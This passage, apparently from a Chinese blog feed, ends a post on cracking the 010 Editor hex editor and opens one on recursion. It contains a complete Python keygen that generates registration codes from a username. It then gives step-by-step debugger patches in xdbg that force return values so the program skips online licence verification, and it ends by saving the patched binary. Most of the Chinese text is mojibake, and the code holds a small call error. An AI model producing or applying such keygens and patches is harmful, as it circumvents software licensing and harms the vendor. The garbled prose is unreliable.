class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>tables = [<span class="hljs-number">0x39cb44b8</span>, <span class="hljs-number">0x23754f67</span>, <span class="hljs-number">0x5f017211</span>, <span class="hljs-number">0x3ebb24da</span>, <span class="hljs-number">0x351707c6</span>, <span class="hljs-number">0x63f9774b</span>, <span class="hljs-number">0x17827288</span>, <span class="hljs-number">0x0fe74821</span>,<br>         <span class="hljs-number">0x5b5f670f</span>, <span class="hljs-number">0x48315ae8</span>, <span class="hljs-number">0x785b7769</span>, <span class="hljs-number">0x2b7a1547</span>, <span class="hljs-number">0x38d11292</span>, <span class="hljs-number">0x42a11b32</span>, <span class="hljs-number">0x35332244</span>, <span class="hljs-number">0x77437b60</span>,<br>         <span class="hljs-number">0x1eab3b10</span>, <span class="hljs-number">0x53810000</span>, <span class="hljs-number">0x1d0212ae</span>, <span class="hljs-number">0x6f0377a8</span>, <span class="hljs-number">0x43c03092</span>, <span class="hljs-number">0x2d3c0a8e</span>, <span class="hljs-number">0x62950cbf</span>, <span class="hljs-number">0x30f06ffa</span>,<br>         <span class="hljs-number">0x34f710e0</span>, <span class="hljs-number">0x28f417fb</span>, <span class="hljs-number">0x350d2f95</span>, <span class="hljs-number">0x5a361d5a</span>, <span class="hljs-number">0x15cc060b</span>, <span class="hljs-number">0x0afd13cc</span>, <span class="hljs-number">0x28603bcf</span>, <span class="hljs-number">0x3371066b</span>,<br>         <span class="hljs-number">0x30cd14e4</span>, <span class="hljs-number">0x175d3a67</span>, <span class="hljs-number">0x6dd66a13</span>, <span class="hljs-number">0x2d3409f9</span>, <span class="hljs-number">0x581e7b82</span>, <span class="hljs-number">0x76526b99</span>, <span class="hljs-number">0x5c8d5188</span>, <span class="hljs-number">0x2c857971</span>,<br>         <span class="hljs-number">0x15f51fc0</span>, <span class="hljs-number">0x68cc0d11</span>, <span class="hljs-number">0x49f55e5c</span>, <span class="hljs-number">0x275e4364</span>, <span class="hljs-number">0x2d1e0dbc</span>, <span class="hljs-number">0x4cee7ce3</span>, <span class="hljs-number">0x32555840</span>, <span class="hljs-number">0x112e2e08</span>,<br>         <span class="hljs-number">0x6978065a</span>, <span class="hljs-number">0x72921406</span>, <span class="hljs-number">0x314578e7</span>, <span class="hljs-number">0x175621b7</span>, <span class="hljs-number">0x40771dbf</span>, <span class="hljs-number">0x3fc238d6</span>, <span class="hljs-number">0x4a31128a</span>, <span class="hljs-number">0x2dad036e</span>,<br>         <span class="hljs-number">0x41a069d6</span>, <span class="hljs-number">0x25400192</span>, <span class="hljs-number">0x00dd4667</span>, <span class="hljs-number">0x6afc1f4f</span>, <span class="hljs-number">0x571040ce</span>, <span class="hljs-number">0x62fe66df</span>, <span class="hljs-number">0x41db4b3e</span>, <span class="hljs-number">0x3582231f</span>,<br>         <span class="hljs-number">0x55f6079a</span>, <span class="hljs-number">0x1ca70644</span>, <span class="hljs-number">0x1b1643d2</span>, <span class="hljs-number">0x3f7228c9</span>, <span class="hljs-number">0x5f141070</span>, <span class="hljs-number">0x3e1474ab</span>, <span class="hljs-number">0x444b256e</span>, <span class="hljs-number">0x537050d9</span>,<br>         <span class="hljs-number">0x0f42094b</span>, <span class="hljs-number">0x2fd820e6</span>, <span class="hljs-number">0x778b2e5e</span>, <span class="hljs-number">0x71176d02</span>, <span class="hljs-number">0x7fea7a69</span>, <span class="hljs-number">0x5bb54628</span>, <span class="hljs-number">0x19ba6c71</span>, <span class="hljs-number">0x39763a99</span>,<br>         <span class="hljs-number">0x178d54cd</span>, <span class="hljs-number">0x01246e88</span>, <span class="hljs-number">0x3313537e</span>, <span class="hljs-number">0x2b8e2d17</span>, <span class="hljs-number">0x2a3d10be</span>, <span class="hljs-number">0x59d10582</span>, <span class="hljs-number">0x37a163db</span>, <span class="hljs-number">0x30d6489a</span>,<br>         <span class="hljs-number">0x6a215c46</span>, <span class="hljs-number">0x0e1c7a76</span>, <span class="hljs-number">0x1fc760e7</span>, <span class="hljs-number">0x79b80c65</span>, <span class="hljs-number">0x27f459b4</span>, <span class="hljs-number">0x799a7326</span>, <span class="hljs-number">0x50ba1782</span>, <span class="hljs-number">0x2a116d5c</span>,<br>         <span class="hljs-number">0x63866e1b</span>, <span class="hljs-number">0x3f920e3c</span>, <span class="hljs-number">0x55023490</span>, <span class="hljs-number">0x55b56089</span>, <span class="hljs-number">0x2c391fd1</span>, <span class="hljs-number">0x2f8035c2</span>, <span class="hljs-number">0x64fd2b7a</span>, <span class="hljs-number">0x4ce8759a</span>,<br>         <span class="hljs-number">0x518504f0</span>, <span class="hljs-number">0x799501a8</span>, <span class="hljs-number">0x3f5b2cad</span>, <span class="hljs-number">0x38e60160</span>, <span class="hljs-number">0x637641d8</span>, <span class="hljs-number">0x33352a42</span>, <span class="hljs-number">0x51a22c19</span>, <span class="hljs-number">0x085c5851</span>,<br>         <span class="hljs-number">0x032917ab</span>, <span class="hljs-number">0x2b770ac7</span>, <span class="hljs-number">0x30ac77b3</span>, <span class="hljs-number">0x2bec1907</span>, <span class="hljs-number">0x035202d0</span>, <span class="hljs-number">0x0fa933d3</span>, <span class="hljs-number">0x61255df3</span>, <span class="hljs-number">0x22ad06bf</span>,<br>         <span class="hljs-number">0x58b86971</span>, <span class="hljs-number">0x5fca0de5</span>, <span class="hljs-number">0x700d6456</span>, <span class="hljs-number">0x56a973db</span>, <span class="hljs-number">0x5ab759fd</span>, <span class="hljs-number">0x330e0be2</span>, <span class="hljs-number">0x5b3c0ddd</span>, <span class="hljs-number">0x495d3c60</span>,<br>         <span class="hljs-number">0x53bd59a6</span>, <span class="hljs-number">0x4c5e6d91</span>, <span class="hljs-number">0x49d9318d</span>, <span class="hljs-number">0x103d5079</span>, <span class="hljs-number">0x61ce42e3</span>, <span class="hljs-number">0x7ed5121d</span>, <span class="hljs-number">0x14e160ed</span>, <span class="hljs-number">0x212d4ef2</span>,<br>         <span class="hljs-number">0x270133f0</span>, <span class="hljs-number">0x62435a96</span>, <span class="hljs-number">0x1fa75e8b</span>, <span class="hljs-number">0x6f092fbe</span>, <span class="hljs-number">0x4a000d49</span>, <span class="hljs-number">0x57ae1c70</span>, <span class="hljs-number">0x004e2477</span>, <span class="hljs-number">0x561e7e72</span>,<br>         <span class="hljs-number">0x468c0033</span>, <span class="hljs-number">0x5dcc2402</span>, <span class="hljs-number">0x78507ac6</span>, <span class="hljs-number">0x58af24c7</span>, <span class="hljs-number">0x0df62d34</span>, <span class="hljs-number">0x358a4708</span>, <span class="hljs-number">0x3cfb1e11</span>, <span class="hljs-number">0x2b71451c</span>,<br>         <span class="hljs-number">0x77a75295</span>, <span class="hljs-number">0x56890721</span>, <span class="hljs-number">0x0fef75f3</span>, <span class="hljs-number">0x120f24f1</span>, <span class="hljs-number">0x01990ae7</span>, <span class="hljs-number">0x339c4452</span>, <span class="hljs-number">0x27a15b8e</span>, <span class="hljs-number">0x0ba7276d</span>,<br>         <span class="hljs-number">0x60dc1b7b</span>, <span class="hljs-number">0x4f4b7f82</span>, <span class="hljs-number">0x67db7007</span>, <span class="hljs-number">0x4f4a57d9</span>, <span class="hljs-number">0x621252e8</span>, <span class="hljs-number">0x20532cfc</span>, <span class="hljs-number">0x6a390306</span>, <span class="hljs-number">0x18800423</span>,<br>         <span class="hljs-number">0x19f3778a</span>, <span class="hljs-number">0x462316f0</span>, <span class="hljs-number">0x56ae0937</span>, <span class="hljs-number">0x43c2675c</span>, <span class="hljs-number">0x65ca45fd</span>, <span class="hljs-number">0x0d604ff2</span>, <span class="hljs-number">0x0bfd22cb</span>, <span class="hljs-number">0x3afe643b</span>,<br>         <span class="hljs-number">0x3bf67fa6</span>, <span class="hljs-number">0x44623579</span>, <span class="hljs-number">0x184031f8</span>, <span class="hljs-number">0x32174f97</span>, <span class="hljs-number">0x4c6a092a</span>, <span class="hljs-number">0x5fb50261</span>, <span class="hljs-number">0x01650174</span>, <span class="hljs-number">0x33634af1</span>,<br>         <span class="hljs-number">0x712d18f4</span>, <span class="hljs-number">0x6e997169</span>, <span class="hljs-number">0x5dab7afe</span>, <span class="hljs-number">0x7c2b2ee8</span>, <span class="hljs-number">0x6edb75b4</span>, <span class="hljs-number">0x5f836fb6</span>, <span class="hljs-number">0x3c2a6dd6</span>, <span class="hljs-number">0x292d05c2</span>,<br>         <span class="hljs-number">0x052244db</span>, <span class="hljs-number">0x149a5f4f</span>, <span class="hljs-number">0x5d486540</span>, <span class="hljs-number">0x331d15ea</span>, <span class="hljs-number">0x4f456920</span>, <span class="hljs-number">0x483a699f</span>, <span class="hljs-number">0x3b450f05</span>, <span class="hljs-number">0x3b207c6c</span>,<br>         <span class="hljs-number">0x749d70fe</span>, <span class="hljs-number">0x417461f6</span>, <span class="hljs-number">0x62b031f1</span>, <span class="hljs-number">0x2750577b</span>, <span class="hljs-number">0x29131533</span>, <span class="hljs-number">0x588c3808</span>, <span class="hljs-number">0x1aef3456</span>, <span class="hljs-number">0x0f3c00ec</span>,<br>         <span class="hljs-number">0x7da74742</span>, <span class="hljs-number">0x4b797a6c</span>, <span class="hljs-number">0x5ebb3287</span>, <span class="hljs-number">0x786558b8</span>, <span class="hljs-number">0x00ed4ff2</span>, <span class="hljs-number">0x6269691e</span>, <span class="hljs-number">0x24a2255f</span>, <span class="hljs-number">0x62c11f7e</span>,<br>         <span class="hljs-number">0x2f8a7dcd</span>, <span class="hljs-number">0x643b17fe</span>, <span class="hljs-number">0x778318b8</span>, <span class="hljs-number">0x253b60fe</span>, <span class="hljs-number">0x34bb63a3</span>, <span class="hljs-number">0x5b03214f</span>, <span class="hljs-number">0x5f1571f4</span>, <span class="hljs-number">0x1a316e9f</span>,<br>         <span class="hljs-number">0x7acf2704</span>, <span class="hljs-number">0x28896838</span>, <span class="hljs-number">0x18614677</span>, <span class="hljs-number">0x1bf569eb</span>, <span class="hljs-number">0x0ba85ec9</span>, <span class="hljs-number">0x6aca6b46</span>, <span class="hljs-number">0x1e43422a</span>, <span class="hljs-number">0x514d5f0e</span>,<br>         <span class="hljs-number">0x413e018c</span>, <span class="hljs-number">0x307626e9</span>, <span class="hljs-number">0x01ed1dfa</span>, <span class="hljs-number">0x49f46f5a</span>, <span class="hljs-number">0x461b642b</span>, <span class="hljs-number">0x7d7007f2</span>, <span class="hljs-number">0x13652657</span>, <span class="hljs-number">0x6b160bc5</span>,<br>         <span class="hljs-number">0x65e04849</span>, <span class="hljs-number">0x1f526e1c</span>, <span class="hljs-number">0x5a0251b6</span>, <span class="hljs-number">0x2bd73f69</span>, <span class="hljs-number">0x2dbf7acd</span>, <span class="hljs-number">0x51e63e80</span>, <span class="hljs-number">0x5cf2670f</span>, <span class="hljs-number">0x21cd0a03</span>,<br>         <span class="hljs-number">0x5cff0261</span>, <span class="hljs-number">0x33ae061e</span>, <span class="hljs-number">0x3bb6345f</span>, <span class="hljs-number">0x5d814a75</span>, <span class="hljs-number">0x257b5df4</span>, <span class="hljs-number">0x0a5c2c5b</span>, <span class="hljs-number">0x16a45527</span>, <span class="hljs-number">0x16f23945</span><br>         ]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_quo</span>():</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">0x10000</span>)      <span class="hljs-comment"># è¿™ä¸ªiï¼Œå°±æ˜¯(0x100*(k[1]^k[7])+(k[2]^k[5])</span><br>        eax = (((i ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span> eax % <span class="hljs-number">11</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (eax / <span class="hljs-number">0xb</span> &lt;= <span class="hljs-number">0x3E8</span>):<br>            <span class="hljs-keyword">return</span> i, eax // <span class="hljs-number">0xb</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base_name_calc</span>(<span class="hljs-params">username, a2, a3, a4</span>):</span><br>    result = <span class="hljs-number">0</span><br>    username_len = <span class="hljs-built_in">len</span>(username)<br>    <span class="hljs-keyword">if</span> username_len &gt; <span class="hljs-number">0</span>:<br>        v7 = <span class="hljs-number">0</span><br>        v9 = (<span class="hljs-number">0xf</span> * a4) &amp; <span class="hljs-number">0xff</span><br>        v10 = (<span class="hljs-number">0x11</span> * a3) &amp; <span class="hljs-number">0xff</span><br>        v11 = <span class="hljs-number">0</span><br>        v12 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> v7 &lt; username_len:<br>            upper_char = <span class="hljs-built_in">ord</span>(username[v7].upper())  <span class="hljs-comment"># upper_char = v13</span><br>            v14 = (result + tables[upper_char]) &amp; <span class="hljs-number">0xffffffff</span>    <span class="hljs-comment"># é˜²æ­¢æº¢å‡º</span><br>            <span class="hljs-keyword">if</span> a2:<br>                v15 = (tables[v9] + tables[v10] + tables[upper_char+<span class="hljs-number">0x2f</span>] * (v14 ^ tables[upper_char+<span class="hljs-number">0xd</span>])) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v11<br>            <span class="hljs-keyword">else</span>:       <span class="hljs-comment"># å…¶å®è¿™ä¸ªå¯ä»¥å¿½ç•¥ï¼Œå› ä¸ºa2å§‹ç»ˆä¸ºçœŸ</span><br>                v15 = (tables[v9] + tables[v10] + tables[upper_char + <span class="hljs-number">0x17</span>] * (v14 ^ tables(upper_char+<span class="hljs-number">0x3f</span>))) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v12<br>            result = tables[v16]+v15<br>            v7 = v7 + <span class="hljs-number">1</span><br>            v11 = (v11 + <span class="hljs-number">19</span>) % <span class="hljs-number">0x100</span><br>            v10 = (v10 + <span class="hljs-number">9</span>) % <span class="hljs-number">0x100</span><br>            v9 = (v9 + <span class="hljs-number">13</span>) % <span class="hljs-number">0x100</span><br>            v12 = (v12 + <span class="hljs-number">7</span>) % <span class="hljs-number">0x100</span><br>        <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> result<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input a username:&quot;</span>)<br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">8</span><br>    k[<span class="hljs-number">3</span>] = <span class="hljs-number">0x9c</span>     <span class="hljs-comment"># 0x9cç‰ˆæœ¬æ³¨å†Œç çš„ç®—æ³•</span><br>    v8,v9 = guess_quo()<br>    result = base_name_calc(name, <span class="hljs-literal">True</span>, <span class="hljs-number">0</span>, v9)<br>    k[<span class="hljs-number">4</span>] = result &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">5</span>] = (result &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">6</span>] = (result &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">7</span>] = (result &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">2</span>] = k[<span class="hljs-number">5</span>] ^ (v8 % <span class="hljs-number">0x100</span>)  <span class="hljs-comment"># å›é¡¾ä¸€ä¸‹ä¸Šé¢å–éšæœºå€¼içš„æ—¶å€™</span><br>    k[<span class="hljs-number">1</span>] = k[<span class="hljs-number">7</span>] ^ (v8 &gt;&gt; <span class="hljs-number">8</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k[<span class="hljs-number">0</span>] = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">256</span>)<br>        v10 = (((k[<span class="hljs-number">6</span>] ^ k[<span class="hljs-number">0</span>]) ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">61</span>) % <span class="hljs-number">0x100</span>) ^ <span class="hljs-number">0xa7</span><br>        <span class="hljs-keyword">if</span> v10 &gt;= <span class="hljs-number">10</span>:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):  <span class="hljs-comment"># ä½¿è¾“å‡ºæ›´å®Œç¾</span><br>        <span class="hljs-keyword">if</span> k[i] &lt; <span class="hljs-number">16</span>:<br>            k[i] = <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>].upper()<br>        <span class="hljs-keyword">else</span>:<br>            k[i] = <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>].upper()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Password: %s%s-%s%s-%s%s-%s%s&#x27;</span> % (k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">4</span>], k[<span class="hljs-number">5</span>], k[<span class="hljs-number">6</span>], k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<span class="hljs-comment"># å…¥å£</span><br>   main()<br></code></pre></td></tr></table></figure><h4 id="4-å»é™¤ç½‘ç»œéªŒè¯"><a href="#4-å»é™¤ç½‘ç»œéªŒè¯" class="headerlink" title="4.å»é™¤ç½‘ç»œéªŒè¯"></a>4.å»é™¤ç½‘ç»œéªŒè¯</h4><p>è¿™å—ï¼Œå¦‚æœä¸æ˜¯çœ‹æ–‡ç« çš„è¯ï¼Œæˆ‘è‡ªå·±æ¥æŒ‡å®šä¸ä¼šå†™ï¼Œä½œä¸ºèœé¸¡çš„æˆ‘æ ¹æœ¬æƒ³ä¸åˆ°å¥½å§</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/42.png"></p><p>ä¸è¿‡æ—¢ç„¶çœ‹åˆ°äº†å¤§ä½¬çš„æ“ä½œï¼Œé‚£å°±å­¦ä¸€ä¸‹ï¼Œè™½ç„¶å¹³å¸¸æ¡åƒåœ¾ç”¨ä¸åˆ°ï¼Œä½†å¤šå­¦ç‚¹æ€»å½’ä¸æ˜¯é”™çš„ã€‚</p><p>è¿™é‡Œç”±äºè™šæ‹Ÿæœºçš„ç½‘ç»œæœ‰ç‚¹å°é—®é¢˜ï¼Œå¯¼è‡´è™šæ‹Ÿæœºä¸­ä¸€ç›´ä¸è°ˆç½‘ç»œæ ¡éªŒé‚£ä¸ªé”™è¯¯ä½ç½®ï¼Œå“¦ï¼è¿™ä¹ˆçœ‹æˆ‘å‰é¢çš„æ‰€æœ‰åˆ†æè¿‡ç¨‹å…¨éƒ¨åœ¨æ— ç½‘æƒ…å†µä¸‹è¿›è¡Œï¼Œéš¾åº¦æœ‰æ‰€é™ä½ï¼Œå°±è¿™è¿˜çœ‹äº†é‚£ä¹ˆä¹…ï¼ŒçœŸæ˜¯èœä¸­èœã€‚è™šæ‹Ÿæœºä¸è¡Œï¼Œæ‰€ä»¥åªèƒ½åœ¨ç‰©ç†æœºä¸­è¿›è¡Œæ“ä½œã€‚æ‰“å¼€010Editorï¼Œxdbgè¿›è¡ŒæŒ‚è½½ï¼Œå°†ç¨‹åºèµ°åˆ°å¦‚ä¸‹ä½ç½®</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/43.png"></p><p>ç¨‹åºæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸¤ä¸ªå‡½æ•°éƒ½è¦è¿”å›0x2D(åˆ«é—®ï¼Œé—®å°±æ˜¯æ‹¿ä¸ªæ­£ç¡®çš„æ³¨å†Œç å»è™šæ‹Ÿæœºè¯•ä¸€ä¸‹)ï¼Œè¿™é‡Œç¨‹åºè¿”å›0x113ï¼Œæ˜¯ä¸ªé—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ï¼Œç¨‹åºç»§ç»­å¾€ä¸‹èµ°ï¼Œèµ°åˆ°ä¸€ä¸ªjnsï¼Œè¿™é‡Œéœ€è¦çœ‹ä¸€ä¸‹</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/44.png"></p><p>OKï¼Œåˆ†æç»“æŸï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯è·Ÿæˆ‘ä»¬æƒ³çš„ä¸€æ ·ï¼Œæœç„¶é¢„æœŸä¸€æ ·ï¼Œç¨‹åºèµ°åˆ°å¦‚ä¸‹å›¾ä½ç½®é”™è¯¯ä¿¡æ¯å°±è·³å‡ºæ¥äº†ï¼Œæ‰€ä»¥ï¼Œé‚£ä¸ªjnsä¸èƒ½è·³ï¼Œè·³äº†å°±GG</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/45.png"></p><p>è¿™é‡Œæœ‰è¿‡ä¸€æ¬¡å°†è·³è½¬æ³¨é‡Šæˆnopå°è¯•ï¼Œç¨‹åºåœ¨æ¯æ¬¡æ‰“å¼€çš„æ—¶å€™éƒ½ä¼šè·³å‡ºéªŒè¯é¡µé¢ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥çœ‹jnsä¸Šé¢çš„é‚£ä¸ªå‡½æ•°ã€‚jnsä¸Šé¢æ˜¯ä¸ª<code>test eax,eax</code>ï¼Œåªè¦eaxçš„å€¼ä¸ä¸º0ï¼Œjnså°±ä¸ä¼šè·³ã€‚</p><p>é‡æ–°åŠ è½½ç¨‹åºï¼Œè¿›å…¥<code>call 010editor.7FF611CA94AD</code>ä½ç½®ï¼Œå¼€å§‹å•æ­¥ï¼Œèµ°äº†ä¸€åœˆå‘ç°æ²¡æœ‰æ‰¾åˆ°èƒ½å¤Ÿç›´æ¥æ§åˆ¶eaxå€¼çš„ä½ç½®ï¼Œæ—¢ç„¶è¿™æ ·ï¼Œé‚£å°±ç›´æ¥åœ¨ç¨‹åºçš„æœ€åï¼ŒåŠ ä¸ª<code>mov eax,0x2</code>ï¼Œå› ä¸ºè¦æ±‚çš„æ˜¯å¤§äº0å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥åªè¦æ˜¯ä¸ªå¤§äº0çš„æ•°å°±è¡Œ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/46.png"></p><p>æ”¹å®Œä¹‹åç¨‹åºç»§ç»­å¾€ä¸‹èµ°ï¼Œè·³è½¬æ»¡è¶³ï¼Œä½†æ˜¯æœ‰ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯ï¼Œæ¥ä¸‹æ¥è¿˜æœ‰æ¯”è¾ƒ<code>cmp ebx,0xDB</code>ï¼Œè¦æ˜¯ebxä¸ä¸º0xDBï¼Œåˆ™ä¼šæŠ¥æ³¨å†Œç é”™è¯¯ã€‚åˆ«é—®ä¸ºå•¥çŸ¥é“çš„ï¼Œèµ°äº†å¾ˆå¤šéï¼Œèµ°çš„äººéƒ½éº»äº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/47.png"></p><p>è¿™é‡Œå°†0x113æ›´æ”¹ä¸º0xDBï¼Œå·²ç»æœ‰ç»éªŒäº†ï¼Œç›´æ¥è¿›å…¥è¯¥å‡½æ•°æ›´æ”¹ä¸€ä¸‹è¿”å›çš„ä½ç½®å°±å¯ä»¥äº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/48.png"></p><p>é‡æ–°è½½å…¥ç¨‹åºï¼Œç„¶åè·Ÿç€ä¿®æ”¹ä¹‹åçš„ç¨‹åºèµ°ä¸€ä¸‹ï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸèµ°åˆ°æ³¨å†Œç æ­£ç¡®çš„ä½ç½®ï¼Œä¹Ÿæ²¡æœ‰ç½‘ç»œéªŒè¯</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/49.png"></p><p>æœ€åå°±æ˜¯ä¿®æ”¹è¡¥ä¸ï¼Œä¿å­˜ä¿®æ”¹çš„æ–‡ä»¶ï¼Œå†ç”¨ä¿®æ”¹åçš„æ–‡ä»¶æ›¿æ¢æ‰æºæ–‡ä»¶å°±ç®—æ˜¯å½»åº•å®Œå·¥ï¼Œå½“ç„¶ä¸æ¨èæ›¿æ¢æºæ–‡ä»¶ï¼Œå¯ä»¥æ¢ä¸ªæ–‡ä»¶åï¼Œç„¶åæ›´æ”¹ä¸€ä¸‹å¿«æ·æ–¹å¼ä¸­çš„ç›®æ ‡å°±OKã€‚å®Œå·¥ï¼</p><h4 id="5-æ€»ç»“"><a href="#5-æ€»ç»“" class="headerlink" title="5.æ€»ç»“"></a>5.æ€»ç»“</h4><p>è¿™ç¯‡æ–‡ç« ï¼Œå¤§éƒ¨åˆ†çš„æ€è·¯æ¥æºäºå‚è€ƒé“¾æ¥ä¸­çš„ä¸‰ç¯‡æ–‡ç« ï¼Œåœ¨è‡ªå·±è°ƒè¯•ä»¥åŠæ³¨å†Œæœºçš„ç¼–å†™è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ç§ç§é—®é¢˜ï¼Œä¹Ÿæ˜¯ä¸€ç‚¹ç‚¹çš„è§£å†³ï¼Œä¸€ç‚¹ç‚¹çš„è‡ªå·±å°è¯•ï¼Œå› ä¸ºæœ‰å­¦ä¹ åˆ°ä¸œè¥¿ï¼Œæ•…å°†æ­¤æ¬¡å­¦ä¹ è¿‡ç¨‹è®°å½•ä¸‹æ¥ï¼Œå¯ä»¥è¯´æŠ„è¢­ï¼Œä½†è¿™æ¬¡çš„æŠ„è¢­ç®—æ˜¯æŠ„æ˜ç™½äº†ã€‚è¯´ç™½äº†ï¼Œè¿˜æ˜¯å¤ªèœäº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/50.png"></p><h4 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h4><p><a href="https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2">https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2</a></p><p><a href="https://www.52pojie.cn/thread-1557588-1-1.html">https://www.52pojie.cn/thread-1557588-1-1.html</a></p><p><a href="https://blog.csdn.net/weixin_43272781/article/details/101173877">https://blog.csdn.net/weixin_43272781/article/details/101173877</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>è¢«è¿«çš„è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>recursioné€’å½’ç®—æ³•</title>
    <link href="/2022/01/22/recursion/"/>
    <url>/2022/01/22/recursion/</url>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åˆ·codewarsçš„æ—¶å€™ï¼Œç¢°åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²çš„å…¨æ’åˆ—ï¼Œemmmï¼Œä¸ä¼šï¼Œç„¶åå°±å»å¯»æ‰¾äº†ä¸€ä¸‹è§£å†³æ–¹æ³•ï¼Œå‘ç°æ˜¯ç”¨é€’å½’è¿›è¡Œè§£å†³(å¯èƒ½æœ‰å…¶ä»–æ–¹æ³•ï¼Œä½†æ²¡å‘ç°ï¼Œè°ƒç”¨åº“å‡½æ•°çš„ä¸ç®—)ã€‚ç„¶åçœ‹äº†åŠå¤©åˆ«äººçš„æ€è·¯å‘ç°å§‹ç»ˆæœ‰ç‚¹è¿·ç³Šï¼Œå°±é‡æ–°å­¦ä¹ äº†ä¸€ä¸‹é€’å½’(æˆ‘è®°ç€æˆ‘ä»¥å‰ä¼šï¼Œemmm,å¯èƒ½ä¹Ÿæ˜¯ä¼šçš„ä¸å’‹æ»´)ã€‚</p><h3 id="é€’å½’ç®—æ³•ç®€è¿°"><a href="#é€’å½’ç®—æ³•ç®€è¿°" class="headerlink" title="é€’å½’ç®—æ³•ç®€è¿°"></a>é€’å½’ç®—æ³•ç®€è¿°</h3><p>**é€’å½’ç®—æ³• ** æ˜¯æŒ‡ä¸€ç§é€šè¿‡é‡å¤å°†é—®é¢˜åˆ†è§£ä¸ºåŒç±»çš„å­é—®é¢˜è€Œè§£å†³é—®é¢˜çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯æŒ‡åœ¨å®šä¹‰çš„å‡½æ•°ä¸­è°ƒç”¨å‡½æ•°è‡ªèº«çš„æ–¹æ³•ã€‚é€’å½’ç®—æ³•å®é™…ä¸Šåˆ†ä¸ºä¸¤å±‚æ„æ€ï¼Œä¸€ä¸ªâ€é€’â€ï¼Œä¸€ä¸ªâ€å½’â€ï¼Œè¿™ä¹Ÿæ˜¯åœ¨åç»­ä½¿ç”¨é€’å½’ç®—æ³•ä¸­çš„é‡è¦åœ°æ–¹ã€‚</p><p>æœ¬æ–‡ä¸ä¼šå¯¹é€’å½’çš„æ—¶é—´å¤æ‚åº¦è¿›è¡Œåˆ†æï¼Œå› ä¸ºä¸ä¼šï¼Œåªæ˜¯é€šè¿‡å‡ ä¸ªä¾‹å­æ¥å­¦ä¹ 